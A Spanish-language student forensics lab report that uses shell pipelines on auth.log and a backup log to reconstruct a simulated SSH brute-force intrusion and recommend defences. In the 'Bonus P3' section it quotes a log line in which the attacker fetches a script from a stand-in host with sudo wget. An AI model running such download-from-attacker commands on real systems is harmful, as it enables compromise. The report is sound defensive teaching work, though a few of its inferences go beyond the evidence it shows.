# Informe de Laboratorio N.º 2 - Shell avanzado: ¿qué pasó el fin de semana?
**Grupo:** bitacora-4  
**Integrantes:**
* Luciano Giacomelli (lucianogiacomelli8@gmail.com)

---

## 1. Escenario y Caso Forense
* **Ticket #02:** Análisis de accesos no autorizados durante el fin de semana, identificación del archivo sospechoso y diagnóstico de la tarea nocturna de respaldo.
* **Zona horaria configurada:** `America/Argentina/Buenos_Aires` (validada con `timedatectl`).
* **Integridad del caso:** `sha256sum -c SHA256SUMS` verificado con resultado `OK`.

---

## 2. Evidencia Forense (Salida de ~/informe-fds.txt)

### P1: Intentos fallidos de autenticación
* **Comando:** `grep 'Failed password' auth.log | wc -l`
* **Resultado:**
```text
120
```

### P2: Top de IPs atacantes
* **Comando:** `grep 'Failed password' auth.log | grep -oE 'from [0-9.]+' | cut -d' ' -f2 | sort | uniq -c | sort -rn | head`
* **Resultado:**
```text
     80 203.0.113.42
     20 198.51.100.7
     20 192.0.2.15
```
* **Explicación del pipeline etapa por etapa:**
  1. `grep 'Failed password' auth.log`: Filtra únicamente las líneas que registran autenticaciones fallidas.
  2. `grep -oE 'from [0-9.]+'`: Extrae exclusivamente el patrón `from` seguido de los dígitos y puntos de la IP.
  3. `cut -d' ' -f2`: Divide por el espacio delimitador y se queda con el segundo campo (la dirección IP limpia).
  4. `sort`: Ordena las direcciones alfabéticamente/numéricamente para agrupar líneas consecutivas idénticas (requisito de `uniq`).
  5. `uniq -c`: Cuenta las ocurrencias de cada IP única consecutiva prefijando la cantidad.
  6. `sort -rn`: Ordena el resultado numéricamente (`-n`) de mayor a menor (`-r`).
  7. `head`: Muestra las primeras líneas del ranking.

### P3: Acceso logrado y permanencia del atacante
* **Comandos:**
  * `grep 'Accepted password' auth.log`
  * `grep -E 'session (opened|closed)' auth.log`
* **Resultado:**
```text
Aug 29 03:07:44 srv1 sshd[1399]: Accepted password for sysadmin from 203.0.113.42 port 44123 ssh2
Aug 29 03:07:44 srv1 sshd[1399]: pam_unix(sshd:session): session opened for user sysadmin
Aug 29 03:29:02 srv1 sshd[1399]: pam_unix(sshd:session): session closed for user sysadmin
```
* **Hallazgo:** El atacante logró ingresar por fuerza bruta a las **03:07:44** desde la IP **203.0.113.42** usando la cuenta `sysadmin`. Permaneció conectado **21 minutos y 18 segundos** hasta que la sesión se cerró a las **03:29:02**.

### Bonus P3: Comando ejecutado y fecha del archivo sospechoso
* **Comandos:**
  * `grep -i 'COMMAND' auth.log`
  * `ls -l --time-style=full-iso /tmp/x.sh`
* **Resultado:**
```text
Aug 29 03:12:19 srv1 sudo[1402]:    sysadmin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget [http://203.0.113.42/x.sh](http://203.0.113.42/x.sh)
-rw-r--r-- 1 root root 16 2026-08-29 03:12:30.000000000 -0300 /tmp/x.sh
```
* **Hallazgo:** A las 03:12:19 (4 minutos y 35 segundos después de entrar), el atacante ejecutó `sudo wget` desde el directorio `/tmp` para descargar un script malicioso alojado en su propio servidor (`http://203.0.113.42/x.sh`). La marca de tiempo del archivo (`03:12:30`) coincide plenamente con la ventana de intrusión, demostrando que sabía con precisión qué payload descargar.

### P4: Fallas en la tarea nocturna de respaldo
* **Comando:** `grep 'No space left' respaldo.log`
* **Resultado:**
```text
[2026-08-29 01:31:03] tar: /backup/diario.tar.gz: No space left on device
[2026-08-30 01:31:07] tar: /backup/diario.tar.gz: No space left on device
```
* **Hallazgo:** El respaldo falló las noches del 29 y 30 de agosto aproximadamente a la 01:31 debido a que la partición o dispositivo `/backup` se quedó sin espacio en disco (`No space left on device`).

---

## 3. Experimento de Redirecciones (stdout vs stderr)
* **Comando ejecutado:** `ls /noexiste > salida.txt 2> error.txt`
* **Salida de `salida.txt`:**
```text
(archivo vacío - 0 bytes)
```
* **Salida de `error.txt`:**
```text
ls: no se puede acceder a '/noexiste': No existe el fichero o el directorio
```
* **Explicación técnica:**
  En sistemas UNIX todo proceso dispone por defecto de descriptores de archivo estándar: canal 1 (`stdout`, salida estándar) y canal 2 (`stderr`, salida de error estándar). 
  El operador `>` redirige únicamente el descriptor 1, por lo que `salida.txt` quedó vacío al no producirse ninguna salida normal. Por su parte, `2>` captura específicamente el descriptor 2, desviando el mensaje de error emitido por `ls` hacia `error.txt`.

---

## 4. Preguntas de Cierre

### 1. ¿Por qué uniq exige la entrada ordenada? ¿Qué hace exactamente sort -rn?
* `uniq` únicamente compara líneas consecutivas adyacentes a medida que lee el flujo de datos. Si dos líneas iguales están separadas por otra distinta en el flujo, `uniq` no las detectará como repetidas; por ello es indispensable ordenarlas previamente con `sort`.
* `sort -rn` combina dos modificadores: `-n` (*numeric-sort*) realiza la comparación interpretando los valores como números en lugar de ordenarlos alfabéticamente (evitando que "10" se ordene antes que "2"), y `-r` (*reverse*) invierte el criterio para mostrar el listado en orden descendente (de mayor a menor).

### 2. En el punto 3: reconstruí la línea de tiempo del ataque en 3 renglones. ¿Qué recomendación le harías a la empresa?
* **Línea de tiempo:**
  1. *02:11 a 03:07:* Ataque de fuerza bruta por SSH contra `sysadmin` (80 intentos desde `203.0.113.42`).
  2. *03:07:44:* Acceso exitoso por contraseña de `sysadmin`, abriendo sesión interactiva.
  3. *03:12:19 a 03:29:02:* Elevación de privilegios con `sudo`, descarga del script `/tmp/x.sh` mediante `wget` y desconexión a las 03:29:02 tras 21 minutos.
* **Recomendación técnica:** Deshabilitar la autenticación por contraseña en SSH obligando al uso exclusivo de llaves criptográficas (`PasswordAuthentication no`), cambiar el puerto por defecto, e implementar herramientas de bloqueo reactivo como `fail2ban` o reglas de filtrado con `nftables` para limitar la tasa de intentos (*rate limiting*).

### 3. ¿Cuándo usar 2>/dev/null es útil y cuándo es peligroso?
* **Útil:** En scripts automatizados o pipelines donde se buscan archivos y se desean silenciar advertencias previstas no críticas (por ejemplo, omitir mensajes de `Permiso denegado` al correr `find / -name archivo 2>/dev/null`).
* **Peligroso:** Durante tareas de diagnóstico, depuración o comandos que modifican configuraciones de producción, ya que oculta fallas graves (como falta de espacio, errores de sintaxis, variables inexistentes o fallos de hardware), impidiendo detectar el motivo real por el cual falló un proceso.

### 4. El informe dice "lo va a leer un abogado": ¿qué cambia eso en cómo presentás la evidencia?
* Exige que cada afirmación esté respaldada por evidencia técnica demostrable, inmutable y reproducible (líneas literales de logs con timestamps exactos, hashes de integridad, comandos ejecutados sin ambigüedades y rutas absolutas). 
* Se debe evitar la especulación, los juicios de valor o suposiciones ("el atacante intentó romper todo"), limitando el informe a los hechos comprobables mediante la cadena de custodia de los registros para que posea validez pericial y legal.
